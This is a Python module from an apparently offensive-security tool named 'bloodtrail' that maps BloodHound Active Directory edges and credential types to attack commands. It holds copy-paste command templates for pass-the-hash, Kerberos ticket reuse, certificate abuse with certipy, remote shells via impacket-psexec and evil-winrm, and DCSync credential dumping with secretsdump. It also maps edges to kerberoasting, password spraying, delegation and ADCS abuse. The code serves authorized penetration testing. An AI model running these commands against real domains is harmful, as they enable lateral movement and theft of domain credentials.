"""
Edge and credential type mappings for bloodtrail.

Maps BloodHound edges and credential types to command IDs and templates.
"""

from typing import Dict, List, Optional


# Maps credential type + access type to appropriate command IDs
# Used by pwned_tracker to generate copy-paste ready commands
CRED_TYPE_COMMANDS: Dict[str, Dict[str, List[str]]] = {
    "password": {
        "AdminTo": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
        "CanRDP": ["xfreerdp-connect"],
        "CanPSRemote": ["evil-winrm-shell"],
        "ExecuteDCOM": ["impacket-wmiexec"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-user"],
    },
    "ntlm-hash": {
        "AdminTo": ["psexec-pth", "wmiexec-pth", "smbexec-pth"],
        "CanRDP": ["xfreerdp-pth"],
        "CanPSRemote": ["evil-winrm-hash"],
        "ExecuteDCOM": ["wmiexec-pth"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-hash"],
    },
    "kerberos-ticket": {
        "AdminTo": ["psexec-kerberos", "wmiexec-kerberos"],
        "CanRDP": ["xfreerdp-kerberos"],
        "CanPSRemote": ["evil-winrm-kerberos"],
        "ExecuteDCOM": ["wmiexec-kerberos"],
        "DCSync": ["ad-dcsync-impacket-secretsdump-kerberos"],
    },
    "certificate": {
        "AdminTo": ["certipy-auth-pth"],
        "CanRDP": ["certipy-auth-rdp"],
        "CanPSRemote": ["certipy-auth-winrm"],
        "DCSync": ["certipy-auth-dcsync"],
    },
}


# Command templates by credential type (with auto-fill placeholders)
# These are the actual command strings with credential placeholders filled
CRED_TYPE_TEMPLATES: Dict[str, Dict[str, str]] = {
    "password": {
        "AdminTo": "impacket-psexec '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /p:'<CRED_VALUE>' /d:<DOMAIN>",
        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -p '<CRED_VALUE>'",
        "DCSync": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<DC_IP>",
        "secretsdump": "impacket-secretsdump '<DOMAIN>/<USERNAME>:<CRED_VALUE>'@<TARGET>",
    },
    "ntlm-hash": {
        "AdminTo": "impacket-psexec -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<CRED_VALUE> /d:<DOMAIN>",
        "CanPSRemote": "evil-winrm -i <TARGET> -u <USERNAME> -H <CRED_VALUE>",
        "DCSync": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<DC_IP>",
        "secretsdump": "impacket-secretsdump -hashes :<CRED_VALUE> '<DOMAIN>/<USERNAME>'@<TARGET>",
    },
    "kerberos-ticket": {
        "AdminTo": "KRB5CCNAME=<CRED_VALUE> impacket-psexec -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "xfreerdp /v:<TARGET> /u:<USERNAME> /d:<DOMAIN> /kerberos",
        "CanPSRemote": "KRB5CCNAME=<CRED_VALUE> evil-winrm -i <TARGET> -r <DOMAIN>",
        "DCSync": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<DC_IP>",
        "secretsdump": "KRB5CCNAME=<CRED_VALUE> impacket-secretsdump -k -no-pass '<DOMAIN>/<USERNAME>'@<TARGET>",
    },
    "certificate": {
        "AdminTo": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-psexec -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<TARGET>",
        "CanRDP": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && xfreerdp /v:<TARGET> /u:<USERNAME> /pth:<NTLM>",
        "CanPSRemote": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && evil-winrm -i <TARGET> -u <USERNAME> -H <NTLM>",
        "DCSync": "certipy auth -pfx <CRED_VALUE> -domain <DOMAIN> -dc-ip <DC_IP> && impacket-secretsdump -hashes :<NTLM> '<DOMAIN>/<USERNAME>'@<DC_IP>",
    },
}


# Edge type to command ID mappings (for attack sequence building)
EDGE_COMMAND_MAPPINGS: Dict[str, List[str]] = {
    # Access Edges
    "AdminTo": ["impacket-psexec", "impacket-wmiexec", "impacket-smbexec"],
    "CanRDP": ["xfreerdp-connect"],
    "CanPSRemote": ["evil-winrm-shell"],
    "ExecuteDCOM": ["impacket-wmiexec"],
    "HasSession": ["impacket-psexec"],  # Get shell to harvest creds

    # Permission Edges (ACL abuse)
    "GenericAll": ["crackmapexec-smb-spray"],  # Reset password then spray
    "GenericWrite": ["impacket-getuserspns-kerberoast"],  # Add SPN then kerberoast
    "WriteDacl": [],  # TODO: add dacledit command
    "WriteOwner": [],  # TODO: add owneredit command
    "ForceChangePassword": ["crackmapexec-smb-spray"],  # Spray with new password
    "AddMember": [],  # TODO: add net-group-add command
    "Owns": ["crackmapexec-smb-spray"],  # Full control - reset password

    # Privilege Edges
    "GetChanges": ["ad-dcsync-impacket-secretsdump-user"],
    "GetChangesAll": ["ad-dcsync-impacket-secretsdump-user"],
    "AllExtendedRights": ["ad-dcsync-impacket-secretsdump-user"],

    # Credential Edges
    "ReadGMSAPassword": ["gmsadumper", "bloodyad-gmsa"],
    "ReadLAPSPassword": ["laps-password-cme", "laps-password-ldapsearch"],
    "AddKeyCredentialLink": ["certipy-shadow"],  # TODO: add pywhisker command
    "SyncLAPSPassword": ["laps-password-cme", "laps-password-ldapsearch"],

    # Delegation Edges
    "AllowedToDelegate": ["rubeus-s4u-impersonate", "impacket-getST-constrained"],
    "AllowedToAct": ["rbcd-getST", "rubeus-s4u-impersonate"],
    "AddAllowedToAct": ["rbcd-set-msds"],
    "WriteAccountRestrictions": ["rbcd-set-msds", "bloodyad-rbcd"],

    # ADCS Edges (Certificate Services)
    "ADCSESC1": ["certipy-req-esc1"],
    "ADCSESC3": ["certipy-req-esc1"],
    "ADCSESC4": ["certipy-req-esc4"],
    "ADCSESC5": ["certipy-find"],
    "ADCSESC6a": ["certipy-req-esc1"],
    "ADCSESC6b": ["certipy-req-esc1"],
    "ADCSESC7": ["certipy-req-esc7"],
    "ADCSESC9a": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC9b": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC10a": ["certipy-req-esc1", "certipy-auth"],
    "ADCSESC10b": ["certipy-shadow"],
    "ADCSESC13": ["certipy-req-esc1"],
    "GoldenCert": ["certipy-forge"],
    "Enroll": ["certipy-req-esc1", "certify-request"],
    "EnrollOnBehalfOf": ["certipy-req-esc1"],
    "ManageCA": ["certipy-req-esc7"],
    "ManageCertificates": ["certipy-req-esc7"],

    # Coercion Edges
    "CoerceToTGT": ["petitpotam-coerce", "coercer-coerce", "printerbug-trigger", "dfscoerce-trigger"],

    # SID/Trust Edges
    "HasSIDHistory": ["impacket-psexec", "impacket-wmiexec"],
    "TrustedBy": ["impacket-psexec"],

    # Other PrivEsc Edges
    "WriteSPN": ["impacket-getuserspns-kerberoast"],

    # Membership (informational)
    "MemberOf": [],
}


def get_commands_for_cred_type(cred_type: str, access_type: str) -> List[str]:
    """
    Get command IDs for a credential type and access type combination.

    Args:
        cred_type: password, ntlm-hash, kerberos-ticket, certificate
        access_type: AdminTo, CanRDP, CanPSRemote, etc.

    Returns:
        List of command IDs
    """
    return CRED_TYPE_COMMANDS.get(cred_type, {}).get(access_type, [])


def get_command_template(cred_type: str, access_type: str) -> Optional[str]:
    """
    Get ready-to-fill command template for credential type and access type.

    Args:
        cred_type: password, ntlm-hash, kerberos-ticket, certificate
        access_type: AdminTo, CanRDP, CanPSRemote, etc.

    Returns:
        Command template string with placeholders
    """
    return CRED_TYPE_TEMPLATES.get(cred_type, {}).get(access_type)
